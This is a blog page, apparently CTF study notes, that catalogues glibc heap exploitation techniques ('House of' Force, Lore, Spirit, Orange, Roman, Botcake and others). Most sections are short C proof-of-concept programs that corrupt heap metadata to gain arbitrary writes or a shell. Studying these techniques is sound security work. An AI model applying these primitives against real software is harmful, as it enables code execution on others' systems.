@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#005f6b">
+  <meta name="description" content="Software Security Researcher">
+  <meta name="author" content>
+  <meta name="keywords" content>
+  <title>House of All in One - B3ale</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<link rel="alternate" href="/atom.xml" title="B3ale" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+
+<body>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>B3ale</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">Links</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Saturday, April 25th 2020, 11:39 pm
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.6k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      10 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p><code>House-of-*</code> 是对堆漏洞利用的一系列技术，起源于一篇叫做 Malleus Maleficarum（也有一本中世纪的时候有关女巫的条约的书叫做<a href="https://en.wikipedia.org/wiki/Malleus_Maleficarum" target="_blank" rel="noopener">女巫之槌</a>）的文章。</p>
+<a id="more"></a>
+<h1 id="Malleus-Maleficarum"><a href="#Malleus-Maleficarum" class="headerlink" title="Malleus Maleficarum"></a><a href="https://dl.packetstormsecurity.net/papers/attack/MallocMaleficarum.txt" target="_blank" rel="noopener">Malleus Maleficarum</a></h1><h2 id="House-of-Prime-glibc-2-3-5"><a href="#House-of-Prime-glibc-2-3-5" class="headerlink" title="House of Prime (glibc-2.3.5)"></a>House of Prime (glibc-2.3.5)</h2><p>TODO</p>
+<p>(<a href="https://gbmaster.wordpress.com/2014/08/24/x86-exploitation-101-this-is-the-first-witchy-house/" target="_blank" rel="noopener">X86 EXPLOITATION 101: THIS IS THE FIRST WITCHY HOUSE</a>)</p>
+<pre><code class="cpp">void
+_int_free(mstate av, Void_t* mem)
+{
+    mchunkptr       p;           /* chunk corresponding to mem */
+    INTERNAL_SIZE_T size;        /* its size */
+    mfastbinptr*    fb;          /* associated fastbin */
+    ...
+
+    p = mem2chunk(mem);
+    size = chunksize(p);
+
+    if (__builtin_expect ((uintptr_t) p &gt; (uintptr_t) -size, 0)
+        || __builtin_expect ((uintptr_t) p &amp; MALLOC_ALIGN_MASK, 0))
+    {
+        errstr = &quot;free(): invalid pointer&quot;;
+      errout:
+        malloc_printerr (check_action, errstr, mem);
+        return;
+    }
+</code></pre>
+<h2 id="House-of-Mind-glibc-2-3-5"><a href="#House-of-Mind-glibc-2-3-5" class="headerlink" title="House of Mind (glibc-2.3.5)"></a>House of Mind (glibc-2.3.5)</h2><p>TODO</p>
+<p>(<a href="https://gbmaster.wordpress.com/2015/06/15/x86-exploitation-101-house-of-mind-undead-and-loving-it/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF MIND” – UNDEAD AND LOVING IT…</a>)</p>
+<pre><code class="cpp">public_fREe(Void_t* mem)
+{
+  mstate ar_ptr;
+  mchunkptr p;                          /* chunk corresponding to mem */
+
+  void (*hook) (__malloc_ptr_t, __const __malloc_ptr_t) = __free_hook;
+  if (hook != NULL) {
+    (*hook)(mem, RETURN_ADDRESS (0));
+    return;
+  }
+
+  if (mem == 0)                              /* free(0) has no effect */
+    return;
+
+  p = mem2chunk(mem);
+
+#if HAVE_MMAP
+  if (chunk_is_mmapped(p))                       /* release mmapped memory. */
+  {
+    munmap_chunk(p);
+    return;
+  }
+#endif
+
+  ar_ptr = arena_for_chunk(p);
+#if THREAD_STATS
+  if(!mutex_trylock(&amp;ar_ptr-&gt;mutex))
+    ++(ar_ptr-&gt;stat_lock_direct);
+  else {
+    (void)mutex_lock(&amp;ar_ptr-&gt;mutex);
+    ++(ar_ptr-&gt;stat_lock_wait);
+  }
+#else
+  (void)mutex_lock(&amp;ar_ptr-&gt;mutex);
+#endif
+  _int_free(ar_ptr, mem);
+  (void)mutex_unlock(&amp;ar_ptr-&gt;mutex);
+}
+</code></pre>
+<h2 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h2><p>Modify top chunk to control buffer.</p>
+<p>(<a href="https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF FORCE” – JEDI OVERFLOW</a>)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+#define offset1 0x601080 - 0x10 - 0x602020 - 0x10
+#define offset2 0x7fffffffdf10 - 0x10 - 0x6014f0 - 0x10
+
+char buf1[50] = &quot;Original Buffer (bss).&quot;;
+
+int main() {
+    void *p, *q;
+    char buf2[50] = &quot;Original Buffer (stack).&quot;;
+    p = malloc(0x18);
+    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff
+    malloc(offset1);
+    q = malloc(0x48);
+    puts(buf1);
+    memset(q, &#39;X&#39;, strlen(buf1));
+    puts(buf1);
+
+    /*
+    p = malloc(0x18);
+    *(uint64_t *)((uint64_t)p + 0x18) = -1; // Set top chunk&#39;s size = 0xffffffffffffffff
+    malloc(offset2);
+    q = malloc(0x48);
+    puts(buf2);
+    memset(q, &#39;Y&#39;, strlen(buf2));
+    puts(buf2);
+    */
+    exit(0);
+}
+</code></pre>
+<h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>Use the mechanism of smallbin to control buffer. (maybe Smallbin Attack)</p>
+<p>(<a href="https://gbmaster.wordpress.com/2015/07/16/x86-exploitation-101-house-of-lore-people-and-traditions/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF LORE” – PEOPLE AND TRADITIONS</a>)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+void sh() {
+    system(&quot;/bin/sh&quot;);
+    exit(0);
+}
+
+int main() {
+    void *p, *q, *r, *s, *t;
+    char buf1[0x20], buf2[0x20];
+    fprintf(stderr, &quot;buf1 =&gt; %p\n&quot;, buf1);
+    fprintf(stderr, &quot;buf2 =&gt; %p\n&quot;, buf2);
+
+    p = malloc(0x68);
+    fprintf(stderr, &quot;p = malloc(0x68) =&gt; %p\n&quot;, p);
+    *(uint64_t *)((uint64_t)buf1 + 0x10) = (uint64_t)p - 0x10; // Set buf1&#39;s fd = p - 0x10
+    *(uint64_t *)((uint64_t)buf1 + 0x18) = (uint64_t)buf2; // Set buf1&#39;s bk = buf2
+    *(uint64_t *)((uint64_t)buf2 + 0x10) = (uint64_t)buf1; // Set buf2&#39;s fd = buf1
+
+    q = malloc(0x408);
+    fprintf(stderr, &quot;q = malloc(0x408) =&gt; %p\n&quot;, q);
+    free(p);
+    r = malloc(0x508);
+    fprintf(stderr, &quot;r = malloc(0x508) =&gt; %p\n&quot;, r); // Trigger malloc_consolidate
+    *(uint64_t *)((uint64_t)p + 0x8) = (uint64_t)buf1; // Set p&#39;s bk = buf1
+    s = malloc(0x68);
+    fprintf(stderr, &quot;s = malloc(0x68) =&gt; %p\n&quot;, s); // Get p (The original Freed Chunk)
+    t = malloc(0x68);
+    fprintf(stderr, &quot;t = malloc(0x68) =&gt; %p\n&quot;, t); // Allacte to Stack
+    uint64_t sh_addr = (uint64_t)sh;
+    memcpy(t + 0x48, &amp;sh_addr, 8);
+}
+</code></pre>
+<h2 id="House-of-Spirit"><a href="#House-of-Spirit" class="headerlink" title="House of Spirit"></a>House of Spirit</h2><p>Free a fake chunk into fastbin. (Stack overflow)</p>
+<p>(<a href="https://gbmaster.wordpress.com/2015/07/21/x86-exploitation-101-house-of-spirit-friendly-stack-overflow/" target="_blank" rel="noopener">X86 EXPLOITATION 101: “HOUSE OF SPIRIT” – FRIENDLY STACK OVERFLOW</a>)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+
+char target[0x100];
+
+int main() {
+    void *p, *mem;
+    fprintf(stderr, &quot;Target =&gt; %p\n&quot;, target);
+    p = malloc(0x58);
+    mem = (uint64_t *)((uint64_t)target + 0x10); // Get fake chunk&#39;s mem
+    fprintf(stderr, &quot;fake chunk&#39;s mem =&gt; %p\n&quot;, mem);
+    *(uint64_t *)((uint64_t)target + 0x8) = 0x61; // Set fake chunk&#39;s size = 0x61
+    *(uint64_t *)((uint64_t)target + 0x68) = 0x41; // Set fake chunk&#39;s next chunk&#39;s size = 0x41
+    free(p);
+    free(mem);
+    fprintf(stderr, &quot;malloc(0x58) =&gt; %p\n&quot;, malloc(0x58));
+    exit(0);
+}
+</code></pre>
+<h2 id="House-of-Chaos"><a href="#House-of-Chaos" class="headerlink" title="House of Chaos"></a>House of Chaos</h2><pre><code>(&amp;*^^&amp;%$#%$#**_)+_(_)**(%%^##$@%^^*(%$&amp;*%^$&amp;%%^^&amp;#!@^&amp;_)^&amp;...
+</code></pre><h1 id="Later-House"><a href="#Later-House" class="headerlink" title="Later House"></a>Later House</h1><h2 id="House-of-Einherjar"><a href="#House-of-Einherjar" class="headerlink" title="House of Einherjar"></a><a href="https://www.youtube.com/watch?v=tq3mPjsl-H0" target="_blank" rel="noopener">House of Einherjar</a></h2><p>Mostly chunk overlapping. (Unlink, Off by One)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;unistd.h&gt;
+
+int main() {
+    char *p, *q, *r, *s;
+    p = malloc(0x208);
+    q = malloc(0x18);
+    r = malloc(0xf8);
+    s = malloc(0x18);
+
+    printf(&quot;Fake chunk =&gt; %p\n&quot;, p);
+    *(uint64_t *)((uint64_t)p) = 0;
+    *(uint64_t *)((uint64_t)p + 0x8) = 0x221; // Fake chunk&#39;s size
+    // Bypass unlink
+    *(uint64_t *)((uint64_t)p + 0x10) = p; // Fake chunk&#39;s fd
+    *(uint64_t *)((uint64_t)p + 0x18) = p; // Fake chunk&#39;s bk
+
+    printf(&quot;Off by One\n&quot;);
+    *(uint64_t *)((uint64_t)q + 0x10) = 0x220; // prev_size
+    *(uint8_t *)((uint64_t)q + 0x18) = &#39;\x00&#39;; // Off by One
+    free(r); // unlink
+    printf(&quot;malloc(0x310) =&gt; %p\n&quot;, malloc(0x318));
+    return 0;
+}
+</code></pre>
+<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a><a href="http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" target="_blank" rel="noopener">House of Orange</a></h2><p>Create a freed chunk without <code>free()</code> and attack with <code>_IO_FILE</code> structure. (Unsortedbin Attack)</p>
+<pre><code class="cpp">// glibc-2.23 version
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+#define _IO_list_all 0x3c5520
+#define one_gadget 0xf1147
+
+char fake_vtable[0xa8];
+
+int main() {
+    void *p;
+    void *fake_file;
+    p = malloc(0x18);
+    *(uint64_t *)((uint64_t)p + 0x18) = 0xfe1; // Set top chunk&#39;s size = 0xfe1
+    malloc(0x1000); // Trigger sysmalloc (free top chunk)
+    p = malloc(0x500); // Get a unsortedbin-chunk
+    uint64_t libc_base = (uint64_t)(*(uint64_t *)p) - 0x3c5188;
+    fprintf(stderr, &quot;leak libc =&gt; %p\n&quot;, libc_base);
+
+    uint64_t unsorted_bin_chunk_addr = (uint64_t)p + 0x500;
+    fake_file = unsorted_bin_chunk_addr;
+    uint64_t IO_list_all_addr = libc_base + _IO_list_all;
+    // Create fake file (also a fake smallbin)
+    *(uint64_t *)((uint64_t)fake_file + 0x8) = 0x61; // _IO_read_ptr ; Set smallbin&#39;s size
+    *(uint64_t *)((uint64_t)fake_file + 0x18) = IO_list_all_addr - 0x10; // _IO_read_base ; For Unsoredbin Attack
+    // Bypass _IO_overflow_t
+    *(uint64_t *)((uint64_t)fake_file + 0xc0) = 0; // _mode
+    *(uint64_t *)((uint64_t)fake_file + 0x28) = 1; // _IO_write_ptr
+    *(uint64_t *)((uint64_t)fake_file + 0x20) = 0; // _IO_write_base
+    *(uint64_t *)((uint64_t)fake_file + 0xd8) = fake_vtable; // vtable
+
+    uint64_t one_gadget_addr = libc_base + one_gadget;
+    *(uint64_t *)((uint64_t)fake_vtable + 0x18) = one_gadget_addr; // __overflow
+    malloc(1); // Trigger malloc_printerr
+    exit(0);
+}
+</code></pre>
+<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a><a href="https://github.com/shift-crops/House_of_Rabbit" target="_blank" rel="noopener">House of Rabbit</a></h2><p>TODO</p>
+<p>(recommend <a href="http://p4nda.top/2018/04/18/house-of-rabbit/" target="_blank" rel="noopener">P4nda’s article</a>)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+char target[0x50] = &quot;Orignial Buffer.&quot;;
+char buf[0x40];
+
+int main() {
+    void *p, *q;
+    fprintf(stderr, &quot;Target: %s\n&quot;, target);
+    p = malloc(0xa00008);
+    free(p);
+    p = malloc(0xa00008);
+    free(p);
+
+    p = malloc(0x28);
+    q = malloc(0x88);
+    free(p);
+    *(uint64_t *)((uint64_t)buf + 0x8) = 0x11; // Set Fake Chunk1&#39;s size = 0x11
+    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk2&#39;s prev_size = 0xfffffffffffffff1
+    *(uint64_t *)((uint64_t)p) = (uint64_t *)((uint64_t)buf + 0x10); // Set Fastbin Chunk&#39;s fd = Fake Chunk2
+    free(q); // Trigger malloc_consolidate
+
+    *(uint64_t *)((uint64_t)buf + 0x18) = 0xa00001; // Set Fake Chunk
+    malloc(0xa00000);
+    *(uint64_t *)((uint64_t)buf + 0x18) = -0xf; // Set Fake Chunk
+
+    int offset = (uint64_t)&amp;target - ((uint64_t)buf + 0x10) - 0x20;
+    p = malloc(offset);
+    fprintf(stderr, &quot;p = malloc(offset) =&gt; %p\n&quot;, p);
+    void *victim = malloc(0x18);
+    strcpy(victim, &quot;Hacked.&quot;);
+    fprintf(stderr, &quot;Target: %s\n&quot;, target);
+    exit(0);
+}
+</code></pre>
+<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a><a href="https://github.com/romanking98/House-Of-Roman" target="_blank" rel="noopener">House of Roman</a></h2><p>Partial write to control PC. (Off by One, Fastbin Attack, Unsortedbin Attack, etc)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+
+#define libc_base 0x7ffff7a0d000
+#define __malloc_hook libc_base+0x3c4b10
+#define one_gadget libc_base+0xf02a4
+
+int main() {
+    void *p, *q, *r, *s, *u, *v;
+    p = malloc(0x18);
+    q = malloc(0xc8);
+    r = malloc(0x68);
+    *(uint64_t *)((uint64_t)q + 0x68) = 0x61;
+    free(q);
+    q = malloc(0xc8); // Get Unsortedbin addr
+    s = malloc(0x68);
+    u = malloc(0x68); // For fixing Fastbin
+    v = malloc(0x68); // For triggering malloc_printerr
+    *(uint8_t *)((uint64_t)p + 0x18) = 0x71; // Off by One
+
+    free(r);
+    free(s);
+    *(uint8_t *)((uint64_t)s) = 0x20; // Point s&#39;s fd to q
+    *(uint16_t *)((uint64_t)q) = (__malloc_hook - 0x23) &amp; 0xffff; // Point q&#39;s fd to `&amp;__malloc_hook - 0x23`
+    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));
+    fprintf(stderr, &quot;malloc(0x68) =&gt; %p\n&quot;, malloc(0x68));
+    p = malloc(0x68); // Get the chunk @ `&amp;__malloc_hook - 0x23`
+    free(u);
+    *(uint64_t *)((uint64_t)u) = 0; // Set Fastbin&#39;s fd = 0 to fix Fastbin
+
+    q = malloc(0xc8);
+    fprintf(stderr, &quot;malloc(0x18) =&gt; %p\n&quot;, malloc(0x18));
+    free(q);
+    // Unsortedbin Attack
+    *(uint16_t *)((uint64_t)q + 0x8) = (__malloc_hook - 0x10) &amp; 0xffff; // Point q&#39;s bk to `&amp;__malloc_hook - 0x10`
+    fprintf(stderr, &quot;malloc(0xc8) =&gt; %p\n&quot;, malloc(0xc8));
+    // Partial Write one_gadget
+    *(uint16_t *)((uint64_t)p + 0x13) = one_gadget &amp; 0xffff;
+    *(uint8_t *)((uint64_t)p+ 0x15) = (one_gadget &gt;&gt; 16) &amp; 0xff;
+    free(v);
+    free(v); // Trigger malloc_printerr
+    exit(0);
+}
+</code></pre>
+<h2 id="House-of-Botcake-gt-glibc-2-26"><a href="#House-of-Botcake-gt-glibc-2-26" class="headerlink" title="House of Botcake (&gt;= glibc-2.26)"></a><a href="https://raw.githubusercontent.com/shellphish/how2heap/master/glibc_2.26/house_of_botcake.c" target="_blank" rel="noopener">House of Botcake</a> (&gt;= glibc-2.26)</h2><p>Bypass double free restriction on tcache. (Double Free, Chunk Overlapping)</p>
+<pre><code class="cpp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+void *ptr[7];
+char buf[0x20];
+
+int main() {
+    void *p;
+    fprintf(stderr, &quot;target =&gt; %p\n&quot;, buf);
+    for (int i = 0; i &lt; 7; i++) { // Fillup Tcache
+        ptr[i] = malloc(0x108);
+    }
+    p = malloc(0x108);
+    void *victim = malloc(0x108);
+    malloc(0x18); // padding
+
+    for (int i = 0; i &lt; 7; i++) {
+        free(ptr[i]);
+    }
+    free(victim); // Add to unsortedbin
+    free(p); // Consolidate with victim
+
+    malloc(0x108); // get a chunk from Tcache &amp; put victim into Tcache
+    free(victim); // Double free
+    p = malloc(0x128);
+    *(uint64_t *)((uint64_t)p + 0x110) = buf; // Overwrite victim&#39;s fd = buf
+    malloc(0x108);
+    p = malloc(0x108);
+    fprintf(stderr, &quot;p = malloc(0x108) =&gt; %p\n&quot;, p);
+    exit(0);
+}
+</code></pre>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=dooN6X28daI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=dooN6X28daI</a><br><a href="https://ctf-wiki.github.io/ctf-wiki/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/</a><br><a href="https://github.com/shellphish/how2heap" target="_blank" rel="noopener">https://github.com/shellphish/how2heap</a><br><a href="https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/" target="_blank" rel="noopener">https://darkwing.moe/2019/07/18/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-heap%E4%B8%8Emalloc-1/</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/04/26/Basic-Kernel-Exploitation/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Basic Kernel Exploitation</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/04/23/Linux-Sandbox-Setuid/">
+                        <span>Linux Sandbox - Setuid</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "House of All in One&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
